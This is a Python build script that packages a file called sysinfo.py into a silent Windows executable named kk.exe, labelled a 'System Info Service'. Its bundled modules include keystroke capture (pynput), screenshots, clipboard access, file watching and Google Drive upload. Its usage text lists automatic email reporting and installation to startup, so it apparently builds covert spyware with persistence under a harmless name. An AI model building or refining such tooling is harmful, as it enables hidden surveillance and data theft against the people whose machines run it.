"""
Build Script - Converts sysinfo.py into a standalone Windows EXE
Uses PyInstaller to create a single-file executable named kk.exe.

Usage:
    python build_exe.py
"""

import subprocess
import sys
import os

def main():
    print("=" * 60)
    print("  SYSTEM INFO SERVICE - EXE BUILDER")
    print("=" * 60)
    
    # Step 1: Ensure PyInstaller is installed
    print("\n[1/3] Checking PyInstaller...")
    try:
        import PyInstaller
        print(f"  PyInstaller {PyInstaller.__version__} found.")
    except ImportError:
        print("  PyInstaller not found. Installing...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
        print("  PyInstaller installed successfully.")
    
    # Step 2: Build the EXE
    print("\n[2/3] Building kk.exe (this may take a minute)...")
    
    script_dir = os.path.dirname(os.path.abspath(__file__))
    script_path = os.path.join(script_dir, "sysinfo.py")
    
    # PyInstaller command
    # --onefile     = Single EXE file
    # --noconsole   = No console window (runs silently in background)
    # --name        = Output EXE name
    # --hidden-import = Explicitly include modules that might be missed
    
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--noconsole",
        "--name", "kk",
        "--hidden-import", "win32api",
        "--hidden-import", "win32con",
        "--hidden-import", "win32security",
        "--hidden-import", "win32profile",
        "--hidden-import", "win32gui",
        "--hidden-import", "win32process",
        "--hidden-import", "wmi",
        "--hidden-import", "psutil",
        "--hidden-import", "pywintypes",
        "--hidden-import", "win32timezone",
        "--hidden-import", "googleapiclient.discovery",
        "--hidden-import", "googleapiclient.http",
        "--hidden-import", "google.oauth2.service_account",
        "--hidden-import", "google.auth",
        "--hidden-import", "google.auth.transport.requests",
        "--hidden-import", "PIL.Image",
        "--hidden-import", "PIL.ImageGrab",
        "--hidden-import", "win32clipboard",
        "--hidden-import", "pynput.keyboard",
        "--hidden-import", "watchdog.observers",
        "--hidden-import", "watchdog.events",
        "--hidden-import", "winnt",
        "--hidden-import", "urllib3",
        "--hidden-import", "requests",
        "--hidden-import", "zipfile",
        "--distpath", os.path.join(script_dir, "dist"),
        "--workpath", os.path.join(script_dir, "build"),
        "--specpath", script_dir,
        script_path
    ]
    
    result = subprocess.run(cmd, cwd=script_dir)
    
    if result.returncode != 0:
        print("\n[-] Build FAILED! Check the errors above.")
        return
    
    # Step 3: Success
    exe_path = os.path.join(script_dir, "dist", "kk.exe")
    
    if os.path.exists(exe_path):
        size_mb = os.path.getsize(exe_path) / (1024 * 1024)
        print(f"\n[3/3] BUILD SUCCESSFUL!")
        print("=" * 60)
        print(f"  EXE Location: {exe_path}")
        print(f"  EXE Size:     {size_mb:.1f} MB")
        print("=" * 60)
        print("\n  HOW TO USE:")
        print("  " + "-" * 45)
        print(f"  Interactive mode:    kk.exe --menu")
        print(f"  Auto email mode:    kk.exe --auto")
        print(f"  Auto email alias:   kk.exe --report")
        print(f"  Install to startup: kk.exe --install")
        print(f"  Remove from startup: kk.exe --uninstall")
        print("  " + "-" * 45)
    else:
        print(f"\n[-] EXE not found at expected path: {exe_path}")


if __name__ == "__main__":
    main()
